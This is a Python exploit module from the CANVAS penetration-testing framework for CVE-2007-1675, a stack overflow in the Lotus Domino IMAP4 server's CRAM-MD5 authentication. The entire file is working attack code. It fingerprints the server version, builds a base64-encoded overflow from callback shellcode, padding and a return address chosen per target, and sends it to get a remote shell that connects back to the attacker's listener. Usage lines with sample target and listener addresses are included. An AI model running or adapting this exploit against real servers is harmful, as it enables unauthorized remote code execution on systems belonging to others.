#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef

# GUI info
NAME='Lotus Domino IMAP4 Server Overflow'
DESCRIPTION='Lotus Domino IMAP4 Server CRAM-MD5 Stack Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="IBM"
DOCUMENTATION['Date public']='03/28/07'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-07-011.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name'] = 'CVE-2007-1675'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1675'
DOCUMENTATION['CVSS'] = 10.0

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','2003']

GTK2_DIALOG='dialog.glade2'

NAME=DESCRIPTION

NOTES="""
Tested on:
Lotus Domino 7.0.1 on Windows XP Professional SP1a English UP2DATE
Lotus Domino 7.0.1 on Windows 2000 Server SP4 French UP2DATE
Lotus Domino 7.0.2 on Windows 2000 Professional SP4 English UP2DATE

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/domino_cram/domino_cram.py -v 0 -t 10.10.11.136 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

import canvasengine

targets = {
    0:['Autodetect',0],
    1:['Lotus Domino 7.0.1 and 7.0.1FP1 on Windows',0x62cabd52], #0x62c68238
    2:['Lotus Domino 7.0.2 on Windows',0x62c68258],
}

import base64
from MOSDEF import mosdef

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=143
        self.ssl=0
        self.badstring='\0 '
        self.subesp=0
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        self.shellcode=self.createSmallWin32Shellcode(self.callback.ip,self.callback.port)
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        self.ssl=self.argsDict.get('ssl',self.ssl)
        return 
    
    def test(self):
        self.getargs()
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s with ssl=%s'%(self.port,self.ssl))
            return 0
        try:
            data=self.webrecv(s)
        except:
            data=""
        s.close()
        if data.count('Domino IMAP4 Server Release 7.0.')>0:
            return 1
        return 0
    
    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        self.log('%s attacking %s:%d - (in progress)'%(NAME,self.host,self.port))
        s=self.gettcpsock()
        try:
            s.connect((self.host,self.port))
        except:
            self.log('Could not connect to port %s:%s'%(self.host,self.port))
            return 0
        self.log('Connected to target')
        data=self.webrecv(s)
        if self.version==0:
            if data.count('7.0.1')>0:
                self.version=1
            elif data.count('7.0.2')>0:
                self.version=2
            if self.version==0:
                self.log('Autoversioning not available')
                return 0
        self.info,self.eip=targets[self.version]
        self.websend(s,'x AUTHENTICATE CRAM-MD5\r\n')
        data=self.webrecv(s) #check if ok?
        data=''
        if (len(self.shellcode)>256):
            raise Exception,'Shellcode too big!'
        data+=self.shellcode
        data+='A'*(256-len(self.shellcode))
        data+=struct.pack('<L',self.eip)
        data+='BB'
        data+=mosdef.assemble('jmp $-%d'%(len(data)+5),'x86')
        data+=' '
        data+='CC'
        self.websend(s,base64.b64encode(data)+'\r\n')
        time.sleep(6)
        if self.ISucceeded():
            return 1
        s.close()

        return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def usage(self):
        print 'Usage: %s -v version [ -O ssl:1 ] -t host -p port -l localip -d localport\n'%(sys.argv[0])
        self.displayVersions()

if __name__=='__main__':
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
